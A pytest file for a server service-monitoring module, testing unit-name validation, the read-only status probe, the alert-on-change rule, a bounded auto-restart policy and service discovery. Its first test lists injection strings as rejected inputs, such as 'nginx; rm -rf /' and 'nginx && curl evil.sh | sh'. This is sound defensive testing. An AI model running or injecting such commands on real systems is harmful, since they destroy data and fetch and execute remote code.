"""Service monitoring — the decisions that could hurt a server, proved.

Weighted towards two things: the restart bound (an unbounded auto-healer hammers a
crashing box forever) and the refusal to invent an outage (one false 3am alert costs
more trust than a missed check).
"""
from __future__ import annotations

from datetime import datetime, timedelta, timezone

import pytest

from app.services import service_monitor_service as svc


# ── unit names reach a shell, so they are refused rather than escaped ──────────
@pytest.mark.parametrize("bad", [
    "nginx; rm -rf /", "ngi nx", "nginx && curl evil.sh | sh", "$(whoami)",
    "`id`", "nginx\nsystemctl stop sshd", "", "   ", "a" * 129,
])
def test_shell_metacharacters_are_refused_not_escaped(bad):
    with pytest.raises(svc.InvalidUnit):
        svc.valid_unit(bad)


@pytest.mark.parametrize("good", [
    "nginx", "mysql.service", "php8.2-fpm", "redis-server", "getty@tty1", "lshttpd",
])
def test_real_unit_names_are_accepted(good):
    assert svc.valid_unit(good) == good


def test_a_refused_unit_never_reaches_a_built_command():
    with pytest.raises(svc.InvalidUnit):
        svc.build_probe(["nginx", "evil; reboot"])
    with pytest.raises(svc.InvalidUnit):
        svc.build_restart("evil; reboot")


def test_probe_contains_no_mutating_verb():
    """The check must only ever look. Restart is a separate, gated command."""
    import re
    cmd = svc.build_probe(["nginx", "mysql", "redis-server"])
    for verb in ("restart", "stop", "start ", "disable", "mask", "rm ", "kill",
                 "reboot", "systemctl set"):
        assert verb not in cmd, f"probe contains a mutating verb: {verb!r}"
    # Any redirect that writes somewhere REAL. Two things are not writes and must not
    # be flagged: `>/dev/null` discards, and `2>&1` duplicates a file descriptor. A bare
    # ">" check flagged both, which would have meant deleting the assertion rather than
    # sharpening it — and this assertion is the one keeping the probe read-only.
    writes = [m.group(0) for m in re.finditer(r'>>?\s*(?!/dev/null\b)(?!&\d)\S+', cmd)]
    assert not writes, f"probe writes to a file: {writes}"
    assert cmd.count("is-active") == 3


# ── reading state ─────────────────────────────────────────────────────────────
def _out(*rows):
    return "\n".join(f"{svc.SENTINEL}|{u}|{a}|{e}" for u, a, e in rows)


def test_running_service_is_up():
    st = svc.parse_probe(_out(("nginx", "active", "enabled")), ["nginx"])
    assert st["nginx"].ok and st["nginx"].state == "active"


def test_stopped_and_failed_are_both_down():
    st = svc.parse_probe(
        _out(("nginx", "inactive", "enabled"), ("mysql", "failed", "enabled")),
        ["nginx", "mysql"])
    assert not st["nginx"].ok and not st["mysql"].ok
    assert "crashed" in st["mysql"].detail


def test_deliberately_disabled_service_is_named_differently():
    """Stopped AND disabled reads as a decision, not an incident — the wording has to
    reflect that or someone gets paged for something they switched off themselves."""
    st = svc.parse_probe(_out(("postfix", "inactive", "disabled")), ["postfix"])
    assert not st["postfix"].ok
    assert "not to start on boot" in st["postfix"].detail


def test_missing_answer_is_unknown_and_does_NOT_count_as_down():
    """A check we could not complete is our problem, not an outage. Reporting it as
    down would be inventing an incident."""
    st = svc.parse_probe("", ["nginx"])
    assert st["nginx"].state == "unknown"
    assert st["nginx"].ok is True, "unknown must not trip an alert"


def test_unreadable_state_is_also_not_an_outage():
    st = svc.parse_probe(_out(("nginx", "banana", "enabled")), ["nginx"])
    assert st["nginx"].state == "unknown" and st["nginx"].ok is True


# ── the streak rule: alert on change, never per check ─────────────────────────
def test_one_failure_does_not_declare_an_outage():
    status, fails, changed = svc.next_state(
        current_status="up", consecutive_failures=0, ok=False, failure_threshold=2)
    assert status == "up" and fails == 1 and not changed


def test_second_consecutive_failure_declares_it_once():
    status, fails, changed = svc.next_state(
        current_status="up", consecutive_failures=1, ok=False, failure_threshold=2)
    assert status == "down" and fails == 2 and changed


def test_staying_down_does_not_re_announce():
    _, _, changed = svc.next_state(
        current_status="down", consecutive_failures=9, ok=False, failure_threshold=2)
    assert not changed, "a service down for hours must not send an alert per check"


def test_recovery_announces_once_then_goes_quiet():
    status, fails, changed = svc.next_state(
        current_status="down", consecutive_failures=5, ok=True, failure_threshold=2)
    assert status == "up" and fails == 0 and changed
    _, _, again = svc.next_state(
        current_status="up", consecutive_failures=0, ok=True, failure_threshold=2)
    assert not again


# ── the restart bound — the dangerous part ────────────────────────────────────
NOW = datetime(2026, 7, 28, 12, 0, tzinfo=timezone.utc)


def test_no_restart_unless_explicitly_enabled():
    d = svc.restart_decision(auto_restart=False, status="down", restart_count=0,
                             window_started=None, max_restarts=3,
                             restart_window_seconds=1800, now=NOW)
    assert not d.should_restart


def test_no_restart_when_the_service_is_fine():
    d = svc.restart_decision(auto_restart=True, status="up", restart_count=0,
                             window_started=None, max_restarts=3,
                             restart_window_seconds=1800, now=NOW)
    assert not d.should_restart


def test_first_failure_is_restarted():
    d = svc.restart_decision(auto_restart=True, status="down", restart_count=0,
                             window_started=None, max_restarts=3,
                             restart_window_seconds=1800, now=NOW)
    assert d.should_restart and not d.give_up


def test_crash_loop_is_stopped_after_the_limit():
    """The whole reason this function exists. A service that crashes on startup would
    otherwise be restarted forever — hammering the box and hiding the real fault."""
    d = svc.restart_decision(
        auto_restart=True, status="down", restart_count=3,
        window_started=NOW - timedelta(minutes=10),
        max_restarts=3, restart_window_seconds=1800, now=NOW)
    assert not d.should_restart
    assert d.give_up, "hitting the limit must escalate, not fail silently"
    assert "needs a person" in d.reason


def test_a_lapsed_window_starts_fresh():
    """Once a week for a year is not a crash loop, and must not be treated as one."""
    d = svc.restart_decision(
        auto_restart=True, status="down", restart_count=3,
        window_started=NOW - timedelta(hours=8),
        max_restarts=3, restart_window_seconds=1800, now=NOW)
    assert d.should_restart and not d.give_up


def test_a_nonsense_limit_restarts_nothing():
    for bad in (0, -1):
        d = svc.restart_decision(auto_restart=True, status="down", restart_count=0,
                                 window_started=None, max_restarts=bad,
                                 restart_window_seconds=1800, now=NOW)
        assert not d.should_restart, "an unusable limit must fail closed"


def test_the_window_has_a_floor():
    """A one-second window would let a crash loop restart forever, one attempt at a
    time, because the window always looks lapsed."""
    d = svc.restart_decision(
        auto_restart=True, status="down", restart_count=99,
        window_started=NOW - timedelta(seconds=30),
        max_restarts=3, restart_window_seconds=1, now=NOW)
    assert not d.should_restart and d.give_up


# ── restart verification ──────────────────────────────────────────────────────
def test_restart_command_checks_its_own_result():
    cmd = svc.build_restart("nginx")
    assert "systemctl restart" in cmd
    assert "is-active" in cmd, "a restart must verify in the same round trip"


def test_restart_success_is_read_not_assumed():
    assert svc.restart_worked("active") is True
    assert svc.restart_worked("failed") is False
    assert svc.restart_worked("") is False, "no output is not success"


# ── discovery ─────────────────────────────────────────────────────────────────
def test_discovery_only_offers_what_is_installed():
    out = _out(("nginx", "active", "enabled"),
               ("mysql", "not-found", ""),
               ("redis-server", "inactive", "enabled"))
    found = svc.discovered(out)
    labels = {f["label"] for f in found}
    assert "Web server (nginx)" in labels
    assert "Cache (Redis)" in labels, "installed but stopped is still worth watching"
    assert not any("MySQL" in l for l in labels), "absent services must not be offered"


def test_discovery_probe_is_read_only_and_bounded():
    cmd = svc.discovery_probe()
    assert "restart" not in cmd and "stop" not in cmd
    assert cmd.count("is-active") <= svc.MAX_UNITS


def test_a_service_that_is_not_installed_is_not_reported_as_stopped():
    """Found live, and the reason discovery is trustworthy.

    `systemctl is-active nginx` answers "inactive" on a box with no nginx — byte for
    byte what a genuinely stopped service returns. Without the existence field we
    offered MySQL and Redis for watching on servers that had neither, and would then
    have alerted that they were down.
    """
    out = "\n".join([
        f"{svc.SENTINEL}|nginx|inactive||no",       # absent: is-active still says inactive
        f"{svc.SENTINEL}|docker|active|enabled|yes",
        f"{svc.SENTINEL}|redis-server|inactive|enabled|yes",  # genuinely installed, stopped
    ])
    st = svc.parse_probe(out, ["nginx", "docker", "redis-server"])
    assert st["nginx"].state == "not-found"
    assert st["redis-server"].state == "inactive", "installed-but-stopped is a real outage"
    assert st["docker"].ok

    offered = {f["unit"] for f in svc.discovered(out)}
    assert "nginx" not in offered, "an absent service must never be offered"
    assert {"docker", "redis-server"} <= offered


def test_probe_asks_whether_the_unit_exists():
    assert "systemctl cat" in svc.build_probe(["nginx"])
